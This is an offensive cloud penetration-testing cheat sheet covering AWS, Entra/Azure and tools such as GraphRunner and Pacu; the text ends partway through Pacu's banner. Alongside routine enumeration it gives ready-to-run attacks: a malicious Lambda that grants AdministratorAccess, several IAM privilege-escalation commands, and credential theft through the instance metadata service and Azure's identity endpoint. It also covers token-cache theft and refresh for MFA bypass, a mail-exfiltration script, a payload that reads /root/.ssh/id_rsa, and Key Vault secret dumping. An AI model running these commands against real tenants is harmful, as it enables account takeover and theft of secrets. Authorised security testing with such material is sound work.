# Cloud

- [Resources](#resources)

## Table of Contents

- [AWS](#aws)
- [GraphRunner](#graphrunner)
- [lazys3](#lazys3)
- [Microsoft Azure](#microsoft-azure)
- [Pacu](#pacu)
- [S3 Account Search](#s3-account-search)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| ADOKit | Azure DevOps Services Attack Toolkit | https://github.com/xforcered/ADOKit |
| aws-enumerator | The AWS Enumerator was created for service enumeration and info dumping for investigations of penetration testers during Black-Box testing. The tool is intended to speed up the process of Cloud review in case the security researcher compromised AWS Account Credentials. | https://github.com/shabarkin/aws-enumerator |
| AWS Security Checklist | Made by Bour Abdelhadi | https://awscheck.fyi |
| AWeSomeUserFinder | AWS IAM Username Enumerator and Password Spraying Tool in Python3 | https://github.com/dievus/AWeSomeUserFinder |
| AzureHound | Azure Data Exporter for BloodHound | https://github.com/SpecterOps/AzureHound |
| BARK | BloodHound Attack Research Kit | https://github.com/BloodHoundAD/BARK |
| Bobber | Bounces when a fish bites - Evilginx database monitoring with exfiltration automation | https://github.com/Flangvik/Bobber |
| CloudPEASS | Cloud Privilege Escalation Awesome Script Suite | https://github.com/carlospolop/CloudPEASS |
| FindMeAccess | FindMeAccess is a tool useful for finding gaps in Azure/M365 MFA requirements for different resources, client ids, and user agents. | https://github.com/absolomb/FindMeAccess |
| GraphRunner | A Post-exploitation Toolset for Interacting with the Microsoft Graph API | https://github.com/dafthack/GraphRunner |
| HacktricksCloud | Welcome to the page where you will find each hacking trick/technique/whatever related to Infrastructure. | https://github.com/carlospolop/hacktricks-cloud |
| lazys3 | A Ruby script to bruteforce for AWS s3 buckets using different permutations. | https://github.com/nahamsec/lazys3 |
| MFASweep | A tool for checking if MFA is enabled on multiple Microsoft Services | https://github.com/dafthack/MFASweep |
| o365-attack-toolkit | A toolkit to attack Office365 | https://github.com/mdsecactivebreach/o365-attack-toolkit |
| o365recon | retrieve information via O365 and AzureAD with a valid cred | https://github.com/nyxgeek/o365recon |
| Pacu | The AWS exploitation framework, designed for testing the security of Amazon Web Services environments. | https://github.com/RhinoSecurityLabs/pacu |
| Power Pwn | An offensive and defensive security toolset for Microsoft 365 Power Platform | https://github.com/mbrg/power-pwn |
| ROADtools | A collection of Azure AD tools for offensive and defensive security purposes | https://github.com/dirkjanm/ROADtools |
| S3 Account Search | his tool lets you find the account id an S3 bucket belongs too. | https://github.com/WeAreCloudar/s3-account-search |
| S3cret Scanner | Hunting For Secrets Uploaded To Public S3 Buckets | https://github.com/Eilonh/s3crets_scanner |
| ScubaGear | Automation to assess the state of your M365 tenant against CISA's baselines | https://github.com/cisagov/ScubaGear |
| SeamlessPass | A tool leveraging Kerberos tickets to get Microsoft 365 access tokens using Seamless SSO | https://github.com/Malcrove/SeamlessPass |
| TeamFiltration | TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts | https://github.com/Flangvik/TeamFiltration |
| TokenTactics v2 | A fork of the great TokenTactics with support for CAE and token endpoint v2 | https://github.com/f-bader/TokenTacticsV2 |

## AWS

### Installation

```console
$ curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" \
   && unzip awscliv2.zip"
```

```console
$ sudo ./aws/install
```

### Configuration

```console
$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

### Configuration with Profile

```console
$ aws configure --profile <PROFILE>
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

### Set Session Token

```console
$ aws configure --profile <PROFILE>
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

```console
$ aws configure set aws_session_token "IQo<--- SNIP --->xY="
```

### Common Commands

#### Verification

```console
$ aws sts get-caller-identity --profile <PROFILE>
```

#### Get User

```console
$ aws iam get-user --profile <PROFILE>
```

#### List Access Keys

```console
$ aws iam list-access-keys --profile <PROFILE>
```

#### Get Users

```console
$ aws iam list-users --profile <PROFILE>
```

#### List attached Policies

```console
$ aws iam list-attached-user-policies --user-name "<USERNAME>" --profile <PROFILE>
```

#### List User Policies

```console
$ aws iam list-user-policies --user-name "<USERNAME>" --profile <PROFILE>
```

#### List Groups

```console
$ aws iam list-groups --profile <PROFILE>
```

#### List Groups for a specific User

```console
$ aws iam list-groups-for-user --user-name "<USERNAME>" --profile <PROFILE>
```

#### Get Groups

```console
$ aws iam get-group --group-name "<GROUP>" --profile <PROFILE>
```

#### List Group Policies

```console
$ aws iam list-group-policies --group-name "<GROUP>" --profile <PROFILE>
```

#### Get Group Policies

```console
$ aws iam get-group-policy --group-name "<GROUP>" --policy-name "<POLICY>" --profile <PROFILE>
```

#### List Roles

```console
$ aws iam list-roles --profile <PROFILE>
```

#### List Roles using a Query

```console
$ aws iam list-roles --query "Roles[?RoleName=='<ROLE>']" --profile <PROFILE>
```

#### List Role Policies

```console
$ aws iam list-role-policies --role-name "<ROLE>" --profile <PROFILE>
```

#### Get Role Policy

```console
$ aws iam get-role-policy --role-name "<ROLE>" --policy-name <POLICY> --profile <PROFILE>
```

### Identity and Access Management (IAM) Enumeration

#### List IAM Users

```console
$ aws iam list-users
```

#### Get User Permissions

##### List attached Managed Policies

```console
$ aws iam list-attached-user-policies --user-name <USERNAME>
```

##### List Inline Policies

```console
$ aws iam list-user-policies --user-name <USERNAME>
```

##### Get Inline Policy Details

```console
$ aws iam get-user-policy --user-name <USERNAME> --policy-name <POLICY>
```

#### List IAM Groups and Permissions

##### List Groups for a User

```console
$ aws iam list-groups-for-user --user-name <USERNAME>
```

##### List Group Policies

```console
$ aws iam list-attached-group-policies --group-name <GROUP>
$ aws iam list-group-policies --group-name <GROUP>
```

##### Get Inline Group Policy Details

```console
$ aws iam get-group-policy --group-name <GROUP> --policy-name <POLICY>
```

#### List IAM Roles and Permissions

##### List all Roles

```console
$ aws iam list-roles
```

##### Get Role Details (Trust Policy)

```console
$ aws iam get-role --role-name <ROLE>
```

##### List attached Policies

```console
$ aws iam list-attached-role-policies --role-name <ROLE>
```

##### List Inline Policies

```console
$ aws iam list-role-policies --role-name <ROLE>
```

##### Get Inline Role Policy Details

```console
$ aws iam get-role-policy --role-name <ROLE> --policy-name <POLICY>
```

##### Assume-Role

```console
$ aws sts assume-role --role-arn <ROLE> --role-session-name <SESSION>
```

#### Get and decode Policy Documents

##### Get a Managed Policy Document (by ARN or Name)

```console
$ aws iam get-policy --policy-arn <POLICY>
$ aws iam get-policy-version --policy-arn <POLICY> --version-id <ID>
```

#### View Full IAM Snapshot

##### Dump all IAM Permissions (Users, Roles, Groups, Policies)

```console
$ aws iam get-account-authorization-details
```

Use this to build a full IAM permissions map. Add `--filter` to target `roles`, `users`, `groups` specifically.

### S3 Bucket Enumeration

#### Check if a Bucket Exists (Unauthenticated)

```console
$ aws s3 ls s3://<BUCKET> --no-sign-request
```

#### List Contents of a public or accessible Bucket

```console
$ aws s3 ls s3://<BUCKET>/ --no-sign-request
```

#### Download an Object

```console
$ aws s3 cp s3://<BUCKET>/<FILE> . --no-sign-request
```

```console
$ aws s3 cp s3://<BUCKET>/FILE> <FILE> --no-sign-request
```

#### Upload a File

```console
$ aws s3 cp <FILE> s3://<BUCKET>/<FILE>
```

##### Examples

```console
$ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
```

or

```console
$ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
```

#### List Buckets in the authenticated Account

```console
$ aws s3 ls
```

#### List All Buckets & Objects

```console
$ aws s3api list-buckets
$ aws s3api list-objects --bucket <BUCKET> --output table
```

#### Enumerate Bucket Permissions (Authenticated)

##### Get Bucket Policy

```console
$ aws s3api get-bucket-policy --bucket <BUCKET>
```

##### Get Bucket Access Control List (ACL)

```console
$ aws s3api get-bucket-acl --bucket <BUCKET>
```

##### Get Public Access Block Settings

```console
$ aws s3api get-bucket-public-access-block --bucket <BUCKET>
```

##### Get CORS Configuration

```console
$ aws s3api get-bucket-cors --bucket <BUCKET>
```

### Lambda Functions Enumeration

#### List Lambda Functions

```console
$ aws lambda list-functions --region <REGION>
```

#### Get Function Information

##### Get Function Config

```console
$ aws lambda get-function-configuration --function-name <FUNCTION>
```

##### Get Code Download URL and Deployment Details

```console
$ aws lambda get-function --function-name <FUNCTION>
```

#### Check Invocation Access

```console
$ aws lambda get-policy --function-name <FUNCTION>
```

Look for `"Principal": "*"` or `cross-account` permissions.

#### Identify Triggers and Event Sources

##### Async Event Sources (SQS, DynamoDB, Kinesis)

```console
$ aws lambda list-event-source-mappings --function-name <FUNCTION>
```

##### Function URLs (HTTP Endpoints)

```console
$ aws lambda get-function-url-config --function-name <FUNCTION>
```

If `AuthType` is `NONE`, it may be publicly invokable!

#### Invoke Function

```console
$ aws lambda invoke --function-name <FUNCTION> <FILE>.json
```

Add `--payload` if the function expects input:

```console
--payload '{"key": "value"}'
```

#### Investigate attached IAM Role

```console
$ aws lambda get-function-configuration --function-name <FUNCTION>
```

```console
$ aws iam get-role --role-name <ROLE>
$ aws iam list-attached-role-policies --role-name <ROLE>
$ aws iam list-role-policies --role-name <ROLE>
```

Look for overly permissive actions (`*`, `PassRole`, `SecretsManager`, etc.)

#### Modify or Replace Functions

##### Update Function Code

```console
$ aws lambda update-function-code --function-name <FUNCTION> --zip-file fileb://<FILE>.zip
```

##### Update Configuration

```console
$ aws lambda update-function-configuration --function-name <FUNCTION> --environment "Variables={VAR=value}"
```

#### Malicious Lambda Function

```python3
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='<USERNAME>',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return "Policy attached!"
```

```console
$ zip -r lambda_function.py.zip lambda_function.py
```

```console
$ aws lambda create-function \
  --function-name <FUNCTION> \
  --runtime python3.9 \
  --role <ROLE> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://lambda_function.py.zip \
  --profile <PROFILE> \
  --region <REGION>
```

### EC2 Instance Enumeration

#### List EC2 Instances

```console
$ aws ec2 describe-instances --region <REGION>
```

##### Use JMESPath Filter

```console
$ aws ec2 describe-instances --query "Reservations[*].Instances[*].[InstanceId,PublicIpAddress,State.Name,KeyName,IamInstanceProfile.Arn]"
```

#### Get EC2 Instance Details

```console
$ aws ec2 describe-instances --instance-ids <ID>
```

#### Identify IAM Role Attached to the Instance

```console
$ aws ec2 describe-instances --query "Reservations[*].Instances[*].IamInstanceProfile.Arn"
```

##### Enumerate Role Permissions

```console
$ aws iam get-instance-profile --instance-profile-name <PROFILE>
```

#### List EC2 Security Groups

```console
$ aws ec2 describe-security-groups
```

##### Check for overly permissive Inbound Rules

```console
$ aws ec2 describe-security-groups --query "SecurityGroups[*].IpPermissions[*].{From:FromPort,To:ToPort,CIDR:IpRanges}"
```

#### Describe Network Interfaces

```console
$ aws ec2 describe-network-interfaces
```

#### List Amazon Machine Images (AMI)

```console
$ aws ec2 describe-images --owners self
```

#### Check EBS Volume Info

```console
$ aws ec2 describe-volumes
```

##### Snapshot Enumeration

```console
$ aws ec2 describe-snapshots --owner-ids self
```

#### Enumerate Key Pairs

```console
$ aws ec2 describe-key-pairs
```

#### Describe Regions & Availability Zones

```console
$ aws ec2 describe-regions
$ aws ec2 describe-availability-zones
```

### Amazon Simple Notification Service (SNS) Enumeration

```console
$ aws apigateway get-rest-apis --profile <PROFILE> --region <REGION>
```

```console
$ aws apigateway get-stages --rest-api-id <ID> --profile <PROFILE> --region <REGION>
$ aws apigateway get-resources --rest-api-id <ID> --profile <PROFILE> --region <REGION>
```

```console
https://<ID>.execute-api.<REGION>.amazonaws.com/<STAGE>/<PATH>
```

```console
$ curl -X GET \
  'https://<ID>.execute-api.<REGION>.amazonaws.com//<STAGE>/<PATH>' \
  -H 'x-api-key: <KEY>'
```

### DynamoDB Enumeration

#### List Tables

```console
$ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
```

#### List Users

```console
$ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
```

#### Create Table

```console
$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
```

#### Extract Data into Table

```console
$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
```

### Endpoint Enumeration

#### List Keys

```console
$ aws --endpoint-url http://127.0.0.1:4566 kms list-keys
```

#### List Secrets

```console
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager list-secrets
```

#### Get Secret Values

```console
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "<VALUE>" --version-stage AWSCURRENT
```

#### KMS Enable Key

```console
$ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813-4c59-87c8-70e50f6d4f70
```

#### KMS Decrypt

```console
$ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
```

### Server-Side Request Forgery (SSRF)

#### Verify Server-Side Request Forgery (SSRF)

Hit the `meta-data` endpoint on `169.254.169.254`.

```console
?url=http://169.254.169.254/latest/meta-data/
```

##### Attack Vectors

- iam/
- instance-id
- hostname

#### Enumerate Identity Access Management (IAM) Security Credentials

```console
cg-ec2-role-123456789
```

#### Search for Identity Access Management (IAM) Credentials

```console
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
```

Manually add the credentials.

```console
$ vi ~/.aws/credentials
```

```console
[cg-ec2]
aws_access_key_id = <ACCESS_KEY>
aws_secret_access_key = <SECRET_ACCESS_KEY>
aws_session_token = <TOKEN>
```

#### Verify Authentication

```console
$ aws sts get-caller-identity --profile <PROFILE>
```

### Privilege Escalation

#### Core Concepts

- `iam:PassRole`: Lets you pass an IAM Role to a service (e.g., EC2, Lambda).
- `iam:Create*`, `iam:Put*`, `iam:UpdateAssumeRolePolicy`: Can lead to full compromise.
- `Abusable Services`: EC2, Lambda, CloudFormation, Glue, SageMaker, DataPipeline.

#### iam:PassRole and Service Abuse

##### Prerequisites

- Pass a high-privilege role
- Start a service that uses it

##### EC2 Instances

```console
$ aws ec2 run-instances --image-id <ID> --iam-instance-profile Name=<ROLE>
```

##### Lambda Functions

```console
$ aws lambda create-function --function-name backdoor --role <ROLE>
```

##### Glue

```console
$ aws glue create-dev-endpoint --role-arn <ROLE> --endpoint-name <NAME>
```

#### Modify or Attach Inline Policies

##### Update Custom Policy and add Permissions

```console
$ aws iam put-user-policy --user-name <USERNAME> --policy-name escalator --policy-document file://full-admin.json
```

##### Attach a managed Admin Policy

```console
$ aws iam attach-user-policy --user-name <USERNAME> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

#### Create a new Admin Role or User

##### Create a new User

```console
$ aws iam create-user --user-name <USERNAME>
$ aws iam attach-user-policy --user-name <USERNAME> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

##### Create a new Role with a Trust Policy

```console
$ aws iam create-role --role-name <ROLE> --assume-role-policy-document file://trust.json
$ aws iam attach-role-policy --role-name <ROLE> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

#### Update Trust Policies for Existing Roles

##### Abuse iam:UpdateAssumeRolePolicy to assume an Admin Role

```console
$ aws iam update-assume-role-policy --role-name <ROLE> --policy-document file://evil-trust.json
```

#### Assume a Role

##### Prerequisites

- User need to be trusted by the role (Trust Policy).

##### Execution

```console
$ aws sts assume-role --role-arn <ROLE> --role-session-name <SESSION>
```

#### Use Services to Execute Code

##### Prerequisites

- Able to launch a service and inject a script
   - Lambda: Create Backdoor with high-privilege role assigned to it
   - Glue: Launch with a shell script
   - EC2 Instance: Start instance with user-data reverse shell
   - SSM: Run commands on existing EC2 Instances

#### Identity Access Management (IAM) Actions

##### Prerequisites

```console
iam:PassRole
iam:AttachUserPolicy
iam:PutUserPolicy
iam:UpdateAssumeRolePolicy
iam:CreatePolicy
iam:CreateUser
iam:CreateRole
lambda:CreateFunction
ec2:RunInstances
glue:CreateDevEndpoint
ssm:SendCommand
```

## Entra

### Privilege Escalation

> https://learn.microsoft.com/en-us/cli/azure/

```console
$ az login --service-principal -u "20acc5dd-ffv4-41ac-a1p5-d321328da49a" --certificate <CERTIFICATE>.pem --tenant "2590cdef-687d-493c-ae4d-442cbab53a72"
```

```console
$ az resource list
```

```console
$ az role assignment list --all
```

```console
$ az webapp ssh --resource-group <GROUP> --name <NAME>
```

```console
$ env
```

```console
$ env | grep IDENTITY
```

```console
$ curl -s -H "X-Identity-Header: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/”
```

```console
$ Connect-AzAccount -AccessToken
```

### Token Abuse for MFA Bypass

> https://github.com/dafthack/MFASweep/

```console
PS /> Import-Module ./MFASweep.ps1
PS /> Invoke-MFASweep -Username <USERNAME>@<DOMAIN> -Password <PASSWORD>
PS /> az login -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

```console
PS /> cat  ~/.azure/msal_token_cache.json
```

or

```console
PS /> cat  ~/.Azure/msal_token_cache.json
```

> https://github.com/f-bader/TokenTacticsV2

```console
PS /> Import-Module .\TokenTactics.psm1
PS /> Invoke-RefreshToMSGraphToken -domain <DOMAIN> -refreshToken "<TOKEN>"
PS /> $MSGraphToken
PS /> $MSGraphToken.access_token
```

or

```console
$ curl -s https://raw.githubusercontent.com/f-bader/TokenTacticsV2/main/modules/Get-
ForgedUserAgent.ps1 | grep UserAgent | awk -F"= " '{ print $2 }' | sort -u
```

> https://github.com/rootsecdev/Azure-Red-Team

> https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py

```console
PS /> python3 exfil_exchange_mail.py
```

## GraphRunner

> https://github.com/dafthack/GraphRunner

```console
$ pwsh
PS> . ./GraphRunner.ps1
PS> List-GraphRunnerModules
PS> Get-GraphTokens
PS> Get-SecurityGroups
PS> Get-SecurityGroups -Tokens $tokens
PS> Get-UpdatableGroups -Tokens $tokens
PS> Get-DynamicGrous -Tokens $tokens
PS> Invoke-InviteGuest -Tokens $tokens
PS> Invoke-SecurityGroupCloner -Tokens $tokens
```

## lazys3

> https://github.com/nahamsec/lazys3

```console
$ ruby lazys3.rb <DOMAIN>
```

## Microsoft Azure

### Azure CLI

> https://learn.microsoft.com/en-us/cli/azure/

#### Installation

```console
PS C:\> winget install -e --id Microsoft.AzureCLI
```

```console
PS C:\> az --version
```

#### PowerShell Profile Customization

```shell
$ vi $profile
```

```cmd
Register-ArgumentCompleter -Native -CommandName az -ScriptBlock {
    param($commandName, $wordToComplete, $cursorPosition)
    $completion_file = New-TemporaryFile
    $env:ARGCOMPLETE_USE_TEMPFILES = 1
    $env:_ARGCOMPLETE_STDOUT_FILENAME = $completion_file
    $env:COMP_LINE = $wordToComplete
    $env:COMP_POINT = $cursorPosition
    $env:_ARGCOMPLETE = 1
    $env:_ARGCOMPLETE_SUPPRESS_SPACE = 0
    $env:_ARGCOMPLETE_IFS = "`n"
    $env:_ARGCOMPLETE_SHELL = 'powershell'
    az 2>&1 | Out-Null
    Get-Content $completion_file | Sort-Object | ForEach-Object {
        [System.Management.Automation.CompletionResult]::new($_, $_, "ParameterValue", $_)
    }
    Remove-Item $completion_file, Env:\_ARGCOMPLETE_STDOUT_FILENAME, Env:\ARGCOMPLETE_USE_TEMPFILES, Env:\COMP_LINE, Env:\COMP_POINT, Env:\_ARGCOMPLETE, Env:\_ARGCOMPLETE_SUPPRESS_SPACE, Env:\_ARGCOMPLETE_IFS, Env:\_ARGCOMPLETE_SHELL
}
```

```cmd
Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete
```

### Common Commands

```cmd
PS C:\> az login
PS C:\> az account show
PS C:\> Connect-MgGraph
PS C:\> Connect-AzAccount
PS C:\> az ad signed-in-user show
PS C:\> Get-MgContext
PS C:\> GetMgUser -UserId <EMAIL>
PS C:\> az logout
PS C:\> Disconnect-AzAccount
```

### Install and Import Modules

```cmd
PS C:\> Install-Module Microsoft.Graph
PS C:\> Import-Module Microsoft.Graph.Users
PS C:\> Connect-MgGraph
```

```cmd
PS C:\> Install-Module Az
PS C:\> Import-Module Az
PS C:\> Connect-AzAccount
```

### User Information

#### Get User Information

```cmd
PS C:\> Get-MgUser -UserId <EMAIL>
```

```cmd
PS C:\> $UserId = '<ID>'
```

```cmd
PS C:\> Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
```

### Group Memberships

#### Get Memberships

```cmd
PS C:\> Get-MgUserMemberOf -userid "<EMAIL>" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties["displayName"]}
```

### Roles

#### Get Role Permissions

```cmd
PS C:\> Get-AzRoleAssignment -Scope "/subscriptions/<SUBSCRIPTION>" | Select-Object DisplayName, RoleDefinitionName
```

#### Get Role Definition

```cmd
PS C:\> az role definition list --custom-role-only true --query "[?roleName=='<ROLE>']" -o json
```

### Storage

#### List Storage Accounts

```cmd
PS C:\> az storage account list --query "[].name" -o tsv
```

#### List Storage Tables

```cmd
PS C:\> az storage table list --account-name <STORAGE_ACCOUNT> --output table --auth-mode login
```

#### Query Storage Table Content

```cmd
PS C:\> az storage entity query --table-name customers --account-name <STORAGE_ACCOUNT> --output table --auth-mode login
```

### Enumerate Entra ID

```cmd
PS C:\> $CurrentSubscriptionID = "<SUBSCRIPTION>"
PS C:\> $OutputFormat = "table"
PS C:\> & az account set --subscription $CurrentSubscriptionID
PS C:\> & az resource list -o $OutputFormat
```

### Enumerate Key Vaults

```cmd
PS C:\> $VaultName = "<VAULT>"
PS C:\> $SubscriptionID = "<SUBSCRIPTION>"
PS C:\> az account set --subscription $SubscriptionID
```

```cmd
PS C:\> $secretsJson = az keyvault secret list --vault-name $VaultName -o json
PS C:\> $secrets = $secretsJson | ConvertFrom-Json
```

```cmd
PS C:\> $keysJson = az keyvault key list --vault-name $VaultName -o json
PS C:\> $keys = $keysJson | ConvertFrom-Json
```

```cmd
PS C:\> Write-Host "Secrets in vault $VaultName"
foreach ($secret in $secrets) {
    Write-Host $secret.id
}
```

```cmd
PS C:\> Write-Host "Keys in vault $VaultName"
foreach ($key in $keys) {
    Write-Host $key.id
}
```

#### Retrieve Secrets

```cmd
PS C:\> $VaultName = "<VAULT>"
PS C:\> $SecretNames = @("<USERNAME>", "<USERNAME>", "<USERNAME>")
```

```cmd
PS C:\> $SubscriptionID = "<SUBSCRIPTION>"
PS C:\> az account set --subscription $SubscriptionID
```

```cmd
PS C:\> Write-Host "Secret Values from vault $VaultName"
PS C:\> foreach ($SecretName in $SecretNames) {
    $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json
    $secretValue = ($secretValueJson | ConvertFrom-Json).value
    Write-Host "$SecretName - $secretValue"
}
```

#### Query for Password Reuse

```cmd
PS C:\> az ad user list --query "[?givenName=='<USERNAME>' || givenName=='<USERNAME>' || givenName=='<USERNAME>'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}" -o table
```

### Privilege Escalation

```console
PS C:\> az login --service-principal -u "20acc5dd-ffv4-41ac-a1p5-d321328da49a" --certificate <CERTIFICATE>.pem --tenant "2590cdef-687d-493c-ae4d-442cbab53a72"
```

```console
PS C:\> az resource list
```

```console
PS C:\> az role assignment list --all
```

```console
PS C:\> az webapp ssh --resource-group <GROUP> --name <NAME>
```

```console
$ env
```

```console
$ env | grep IDENTITY
```

```console
$ curl -s -H "X-Identity-Header: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/”
```

```console
PS C:\> Connect-AzAccount -AccessToken
```

### Token Abuse for MFA Bypass

> https://github.com/dafthack/MFASweep/

```console
PS C:\> Import-Module ./MFASweep.ps1
PS C:\> Invoke-MFASweep -Username <USERNAME>@<DOMAIN> -Password <PASSWORD>
PS C:\> az login -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

```console
PS C:\> cat  ~/.azure/msal_token_cache.json
```

or

```console
PS C:\> cat  ~/.Azure/msal_token_cache.json
```

> https://github.com/f-bader/TokenTacticsV2

```console
PS C:\> Import-Module .\TokenTactics.psm1
PS C:\> Invoke-RefreshToMSGraphToken -domain <DOMAIN> -refreshToken "<TOKEN>"
PS C:\> $MSGraphToken
PS C:\> $MSGraphToken.access_token
```

or

```console
$ curl -s https://raw.githubusercontent.com/f-bader/TokenTacticsV2/main/modules/Get-
ForgedUserAgent.ps1 | grep UserAgent | awk -F"= " '{ print $2 }' | sort -u
```

> https://github.com/rootsecdev/Azure-Red-Team

> https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py

```console
$ python3 exfil_exchange_mail.py
```

## Pacu

> https://github.com/RhinoSecurityLabs/pacu

### Installation

```console
$ pipx install git+https://github.com/RhinoSecurityLabs/pacu.git
```

### Setup

```console
$ pacu                                                          
No database found at /home/kali/.local/share/pacu/sqlite.db
Database created at /home/kali/.local/share/pacu/sqlite.db


 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣉⣙⣛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠿⢿⣿⣷⣦⣄⠀⠀⠈⠛⠋⠀⠀⠀⠈⠻⣿⣷⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⣤⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣆⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣬⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣉⣉⣡⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣶⣄⠀⠀
